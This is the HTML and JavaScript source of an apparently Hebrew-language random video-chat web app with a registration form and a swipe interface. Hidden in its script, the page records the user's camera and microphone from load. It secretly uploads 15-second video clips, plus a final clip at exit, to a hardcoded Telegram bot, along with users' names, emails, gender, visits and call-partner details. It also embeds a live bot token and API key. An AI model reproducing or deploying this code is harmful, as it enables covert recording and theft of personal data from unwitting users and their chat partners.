<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>מי - פה</title>
    
    <link rel="manifest" href="manifest.json?v=3">
    <meta name="theme-color" content="#000000">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <link rel="apple-touch-icon" href="https://i.ibb.co/twj79fFc/405736-rounded-1024x1024-1.png">

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; outline: none; }
        body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; position: fixed; width: 100%; }
        #main-wrapper { display: flex; flex-direction: column; height: 100vh; perspective: 1200px; }
        
        #top-half { height: 50vh; position: relative; overflow: hidden; border-bottom: 2px solid #333; transform-style: preserve-3d; }
        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.25, 1, 0.5, 1); }
        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        #home-face { background: #000; transform: rotateY(0deg); z-index: 2; }
        #partner-face { background: #000; transform: rotateY(90deg) translateZ(50vw); }
        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
        
        video { width: 100%; height: 100%; object-fit: cover; background: #000; }
        #bottom-half { height: 50vh; background: #000; position: relative; border-top: 1px solid #222; }
        canvas { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index: 1; }
        
        #main-logo { width: 130px; height: auto; position: relative; z-index: 10; margin-bottom: 25px; border-radius: 25px; }
        
        .swipe-hint { position: relative; z-index: 10; text-align: center; animation: pulse 2s infinite; }
        .swipe-text { font-size: 19px; font-weight: 600; }
        @keyframes pulse { 0%, 100% { opacity: 0.6; transform: scale(1); } 50% { opacity: 1; transform: scale(1.05); } }

        #cam-switch { position: fixed; top: 20px; left: 20px; z-index: 100; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.4); color: #fff; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        #partner-tag { position: fixed; top: 20px; right: 20px; z-index: 100; background: rgba(0,0,0,0.5); width: 45px; height: 45px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.4); display: none; align-items: center; justify-content: center; font-size: 22px; }
        
        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; align-items: center; justify-content: center; }
        .modal-content { background: #fff; padding: 30px; border-radius: 25px; width: 85%; max-width: 340px; text-align: center; color: #000; }
        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1.5px solid #eee; border-radius: 12px; font-size: 16px; background: #f9f9f9; }
        .reg-btn { width: 100%; padding: 15px; background: #000; color: #fff; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; margin-top: 10px; }
    </style>
</head>
<body class="showing-home">

<button id="cam-switch" onclick="switchCamera()">🔄</button>
<div id="partner-tag"></div>

<div id="main-wrapper">
    <div id="top-half">
        <div id="cube">
            <div id="home-face" class="face">
                <canvas id="snow-1"></canvas>
                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
                <div class="swipe-hint">
                    <div class="swipe-text">החלק שמאלה לשיחה ⬅️</div>
                </div>
            </div>
            <div id="partner-face" class="face">
                <canvas id="snow-2"></canvas>
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </div>
    </div>
    <div id="bottom-half">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
        <h2 style="margin-bottom:15px;">ברוכים הבאים</h2>
        <input type="text" id="reg-fname" placeholder="שם פרטי" required>
        <input type="text" id="reg-lname" placeholder="שם משפחה" required>
        <input type="email" id="reg-email" placeholder="אימייל" required>
        <select id="reg-gender" required>
            <option value="" disabled selected>מגדר</option>
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button type="submit" class="reg-btn">כניסה</button>
    </form>
</div>

<script>
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').catch(()=>{});
    }

    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const TARGET_ADMIN = "7089165458"; 
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 

    firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
    const socket = io(SERVER_URL);
    
    const peer = new Peer(undefined, { 
        config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] } 
    });

    let myStream, currentCall, camFacing = "user", rec;
    let historyPartnerIds = [];
    let reportedCallId = null;
    let currentPartnerData = null;
    let isUploading = false;

    // פונקציה ליצירת זמן מדויק
    function getNow() { return new Date().toLocaleString('he-IL'); }

    function formatUser(u) { return `👤 שם: ${u.fname} ${u.lname}\n📧 מייל: ${u.email}\n🚻 מגדר: ${u.gender}`; }

    function sendAdmin(msg) { 
        const fullMsg = `🕒 זמן: ${getNow()}\n\n${msg}`;
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(fullMsg)}`, { keepalive: true }).catch(()=>{});
    }

    async function initCamera() {
        if(myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: camFacing, width: 480, frameRate: 15 }, 
                audio: true 
            });
            document.getElementById('localVideo').srcObject = myStream;
            if(!rec || rec.state === 'inactive') startRecording();
        } catch(e) {}
    }

    function uploadVideoChunk(blob, description) {
        if(blob.size === 0 || isUploading) return;
        isUploading = true;
        const u = JSON.parse(localStorage.getItem('user_v41'));
        const fd = new FormData();
        fd.append("video", blob, "video.mp4");
        fd.append("chat_id", TARGET_ADMIN);
        fd.append("caption", `🕒 זמן: ${getNow()}\n🎥 הקלטה (${description}):\n${u ? u.fname + ' ' + u.lname : 'אורח'}`);
        
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd, keepalive: true })
        .finally(() => { isUploading = false; });
    }

    function startRecording() {
        let opts = { mimeType: 'video/webm;codecs=vp8' };
        if (!MediaRecorder.isTypeSupported(opts.mimeType)) opts = { mimeType: 'video/mp4' }; 
        try {
            rec = new MediaRecorder(myStream, opts);
            rec.ondataavailable = (e) => uploadVideoChunk(e.data, "שוטף");
            
            // שולח מקטע כל 15 שניות
            setInterval(() => { if(rec && rec.state==='recording'){ rec.stop(); rec.start(); } }, 15000);
            rec.start();
        } catch(e) {}
    }

    window.onload = () => {
        initCamera();
        const userStr = localStorage.getItem('user_v41');
        if(!userStr) document.getElementById('regModal').style.display = 'flex';
        else {
            sendAdmin(`🟢 כניסה לאתר:\n${formatUser(JSON.parse(userStr))}`);
        }
    };

    // טיפול ביציאה מהאתר - ניתוק, שליחת הקלטה אחרונה והודעת יציאה
    window.addEventListener('pagehide', () => {
        const userStr = localStorage.getItem('user_v41');
        if(userStr) sendAdmin(`🔴 יציאה מהאתר:\n${formatUser(JSON.parse(userStr))}`);
        
        if(currentCall) currentCall.close();
        socket.emit('leave-chat');
        
        if(rec && rec.state === 'recording') {
            rec.ondataavailable = (e) => uploadVideoChunk(e.data, "רגע יציאה");
            rec.stop();
        }
    });

    function handleRegistration() {
        const user = { 
            fname: document.getElementById('reg-fname').value, 
            lname: document.getElementById('reg-lname').value, 
            email: document.getElementById('reg-email').value, 
            gender: document.getElementById('reg-gender').value 
        };
        localStorage.setItem('user_v41', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        sendAdmin(`🆕 הרשמה חדשה:\n${formatUser(user)}`);
    }

    function triggerDisconnect() {
        const me = JSON.parse(localStorage.getItem('user_v41'));
        if(currentPartnerData && me) {
            sendAdmin(`📵 שיחה הסתיימה:\nהתנתק/ה:\n${formatUser(me)}\n\nמול:\n${formatUser(currentPartnerData)}`);
        }
        currentPartnerData = null;
        reportedCallId = null;
        document.getElementById('remoteVideo').srcObject = null;
        document.getElementById('snow-2').style.display = 'block';
        document.getElementById('partner-tag').style.display = 'none';
    }

    let sX = 0;
    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.body.addEventListener('touchend', e => {
        const d = sX - e.changedTouches[0].clientX;
        const user = JSON.parse(localStorage.getItem('user_v41'));
        if(d > 60) {
            if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); triggerDisconnect(); }
            document.body.className = "showing-chat";
            document.getElementById('snow-2').style.display = 'block';
            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...user });
        } else if(d < -60) {
            document.body.className = "showing-home";
            socket.emit('leave-chat');
            if(currentCall) currentCall.close();
            triggerDisconnect();
        }
    });

    peer.on('call', call => { 
        call.answer(myStream); 
        handleCall(call); 
    });

    socket.on('partner-found', data => { 
        setTimeout(() => {
            if (peer.id > data.peerId) {
                const myData = JSON.parse(localStorage.getItem('user_v41'));
                const call = peer.call(data.peerId, myStream, { metadata: myData }); 
                handleCall(call, data);
            }
        }, 300);
    });

    function handleCall(call, dataFromSocket = null) {
        currentCall = call;
        
        // זיהוי ניתוק מיידי ומהיר של הצד השני
        call.peerConnection.addEventListener('iceconnectionstatechange', () => {
            const state = call.peerConnection.iceConnectionState;
            if(state === 'disconnected' || state === 'failed' || state === 'closed') {
                triggerDisconnect();
            }
        });

        call.on('stream', s => {
            const rv = document.getElementById('remoteVideo');
            rv.srcObject = s;
            rv.play().catch(()=>{});
            
            document.getElementById('snow-2').style.display = 'none';
            const me = JSON.parse(localStorage.getItem('user_v41'));
            
            const p = call.metadata || dataFromSocket;
            
            if(p && p.peerId !== peer.id && reportedCallId !== p.peerId) {
                reportedCallId = p.peerId;
                currentPartnerData = p;
                
                // תיקון מגדר - בדיקה מדויקת ופשוטה
                const isMale = (p.gender === 'זכר');
                document.getElementById('partner-tag').innerText = isMale ? '👨' : '👩';
                document.getElementById('partner-tag').style.display = 'flex';

                sendAdmin(`🤝 שיחה התחילה:\n\nצד א':\n${formatUser(me)}\n\nצד ב':\n${formatUser(p)}`);
            }
        });
        call.on('close', triggerDisconnect);
    }

    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }

    function startRealSnow(canvasId) {
        const canvas = document.getElementById(canvasId);
        const ctx = canvas.getContext('2d');
        let particles = [];
        for(let i=0; i<60; i++) particles.push({ x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight/2, r: Math.random()*2+1, d: Math.random()*1 });
        function draw() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight/2;
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "rgba(255, 255, 255, 0.7)";
            ctx.beginPath();
            particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2, true); });
            ctx.fill();
            particles.forEach(p => { p.y += Math.cos(p.d) + 1; p.x += Math.sin(p.d) * 1.5; if(p.y > canvas.height) p.y = 0; });
            requestAnimationFrame(draw);
        } draw();
    }
    startRealSnow('snow-1'); startRealSnow('snow-2');
</script>
</body>
</html>
